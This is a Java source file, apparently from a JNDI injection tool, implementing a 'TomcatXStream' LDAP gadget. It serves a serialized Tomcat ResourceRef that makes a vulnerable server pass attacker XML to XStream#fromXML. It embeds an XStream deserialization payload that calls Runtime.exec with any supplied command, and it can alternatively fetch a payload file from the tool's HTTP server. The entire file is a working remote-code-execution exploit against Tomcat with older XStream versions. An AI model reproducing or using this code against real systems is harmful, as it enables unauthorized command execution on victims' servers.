package net.roboterh.injector.gadgets;

import cn.hutool.http.HttpUtil;
import com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;
import com.unboundid.ldap.sdk.Entry;
import com.unboundid.ldap.sdk.LDAPResult;
import com.unboundid.ldap.sdk.ResultCode;
import net.roboterh.injector.enums.PayloadEnum;
import net.roboterh.injector.servers.HTTPServer;
import net.roboterh.injector.utils.GadgetUtils;
import net.roboterh.injector.utils.PayloadUtils;
import org.apache.log4j.LogManager;
import org.apache.log4j.Logger;
import org.apache.naming.ResourceRef;

import javax.naming.StringRefAddr;
import java.util.Arrays;

/*
    Tomcat XStream Way:
    Requirement:
        Tomcat and XStream < 1.4.17 in classpath
        Tomcat 10.1.0-M14,10.0.21,9.0.63,8.5.79
    Explanation:
        call com.thoughtworks.xstream.XStream#fromXML to load malicious xml
 */
public class TomcatXStream implements LDAPService{
    private static final Logger logger = LogManager.getLogger(TomcatXStream.class);

    private PayloadEnum payload;
    private String[] params;
    private String xmlScript;

    @Override
    public void sendResult(InMemoryInterceptedSearchResult result, String baseDN) {
        argsHandler(baseDN);

        generateHandler();

        try {
            logger.info(String.format("Send LDAP result for %s using TomcatXStream Way ...", baseDN));

            // create ResourceRef
            ResourceRef ref = new ResourceRef("com.thoughtworks.xstream.XStream", null, "", "",
                    true, "org.apache.naming.factory.BeanFactory", null);
            ref.add(new StringRefAddr("forceString", "a=fromXML"));
            ref.add(new StringRefAddr("a", xmlScript));

            Entry entry = new Entry(baseDN);
            entry.addAttribute("javaClassName", "java.lang.Class");
            entry.addAttribute("javaSerializedData", GadgetUtils.serialize(ref));
            result.sendSearchEntry(entry);
            result.setResult(new LDAPResult(0, ResultCode.SUCCESS));
        } catch (Exception e) {
            logger.info(e.getMessage());
        }
    }

    @Override
    public void argsHandler(String baseDN) {
        int firstIndex = baseDN.indexOf("/");
        int secondIndex = baseDN.indexOf("/", firstIndex + 1);

        // obtain the value of Payload
        payload = PayloadEnum.valueOf(baseDN.substring(firstIndex + 1, secondIndex));

        // add params
        switch (payload.name()) {
            case "Command":
                String cmd = PayloadUtils.getCmdFromBase(baseDN);
                params = new String[]{cmd};
                break;
            case "File":
                String filename = baseDN.substring(baseDN.lastIndexOf("/") + 1);
                params = new String[]{filename};
                break;
        }
        logger.info(String.format("Received Payload is %s, params are %s ...", payload, Arrays.toString(params)));
    }

    @Override
    public void generateHandler() {
        try {
            TomcatXStreamTemplate tomcatXStreamTemplate = new TomcatXStreamTemplate();
            switch (payload.name()) {
                case "Command":
                    xmlScript = tomcatXStreamTemplate.getExecCode(params[0]);
                    break;
                case "File":
                    xmlScript = HttpUtil.get(HTTPServer.codeBase + params[0]);
                    break;
            }
        } catch (Exception e) {
            logger.info(e.getMessage());
        }
    }

    private class TomcatXStreamTemplate {
        private String template = "<java.util.PriorityQueue serialization='custom'>\n" +
                "  <unserializable-parents/>\n" +
                "  <java.util.PriorityQueue>\n" +
                "    <default>\n" +
                "      <size>2</size>\n" +
                "    </default>\n" +
                "    <int>3</int>\n" +
                "    <dynamic-proxy>\n" +
                "      <interface>java.lang.Comparable</interface>\n" +
                "      <handler class='sun.tracing.NullProvider'>\n" +
                "        <active>true</active>\n" +
                "        <providerType>java.lang.Comparable</providerType>\n" +
                "        <probes>\n" +
                "          <entry>\n" +
                "            <method>\n" +
                "              <class>java.lang.Comparable</class>\n" +
                "              <name>compareTo</name>\n" +
                "              <parameter-types>\n" +
                "                <class>java.lang.Object</class>\n" +
                "              </parameter-types>\n" +
                "            </method>\n" +
                "            <sun.tracing.dtrace.DTraceProbe>\n" +
                "              <proxy class='java.lang.Runtime'/>\n" +
                "              <implementing__method>\n" +
                "                <class>java.lang.Runtime</class>\n" +
                "                <name>exec</name>\n" +
                "                <parameter-types>\n" +
                "                  <class>java.lang.String</class>\n" +
                "                </parameter-types>\n" +
                "              </implementing__method>\n" +
                "            </sun.tracing.dtrace.DTraceProbe>\n" +
                "          </entry>\n" +
                "        </probes>\n" +
                "      </handler>\n" +
                "    </dynamic-proxy>\n" +
                "    <string>{cmd}</string>\n" +
                "  </java.util.PriorityQueue>\n" +
                "</java.util.PriorityQueue>";

        public String getExecCode(String cmd) {
            return template.replace("{cmd}", cmd);
        }
    }
}
